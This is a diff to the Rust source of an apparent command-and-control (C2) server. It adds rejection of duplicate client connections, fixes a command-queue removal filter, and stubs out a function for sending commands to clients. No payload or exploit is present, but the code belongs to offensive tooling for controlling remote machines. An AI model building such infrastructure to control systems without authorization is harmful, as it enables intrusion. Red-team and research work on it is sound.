@@ -44,20 +44,33 @@ impl C2 {
 
         loop {
             match listener.accept().await {
-                Ok((socket, client_address)) => {
-                    logstorage.add_log(C2Log::new(
-                        LogLevel::Info,
-                        format!(
-                            "Accepted incoming connection from client address: {}",
-                            client_address
-                        ),
-                    ));
-                    self.save_client(
-                        Client::new("hostname".to_owned(), client_address.to_string()),
-                        socket,
-                        logstorage,
-                    )
-                    .await;
+                Ok((mut socket, client_address)) => {
+                    // check if theres a duplicate client
+                    if self.clients.read().await.keys().find(|client| client.ip_address == client_address.to_string()).is_none() {
+                        logstorage.add_log(C2Log::new(
+                            LogLevel::Info,
+                            format!(
+                                "Accepted incoming connection from client address: {}",
+                                client_address
+                            ),
+                        ));
+                        self.save_client(
+                            Client::new("hostname".to_owned(), client_address.to_string()),
+                            socket,
+                            logstorage,
+                        )
+                        .await;
+                    // if no duplicate client
+                    } else {
+                        logstorage.add_log(C2Log::new(
+                            LogLevel::Error,
+                            format!(
+                                "Duplicate client detected from address: {}, connection rejected.",
+                                client_address
+                            ),
+                        ));
+                        let _ = socket.shutdown().await;
+                    }
                 }
                 Err(e) => {
                     logstorage.add_log(C2Log::new(
@@ -66,6 +79,7 @@ impl C2 {
                     ));
                 }
             }
+            
         }
     }
 
@@ -133,7 +147,14 @@ impl C2 {
         self.command_queue
             .write()
             .await
-            .retain(|client| client.id == id);
+            .retain(|client| client.id != id);
+    }
+
+    async fn send_command_to_client(&self, command_entry: &CommandEntry, logstorage: &mut LogStorage) -> Result<String, std::io::Error> {
+        
+        let clients = &command_entry.clients;
+        
+        Ok("ok".to_string())
     }
 
     async fn execute_command(
@@ -165,9 +186,9 @@ impl C2 {
         interface: &mut Interface,
     ) -> Result<(), std::io::Error> {
         if let Some(command) = self.command_queue.read().await.first() {
-            Self::execute_command(command, logstorage, interface);
+            Self::execute_command(command, logstorage, interface).await?;
+            Self::remove_command_from_queue(&self, command.id).await;
         }
-        
         Ok(())
     }
 }
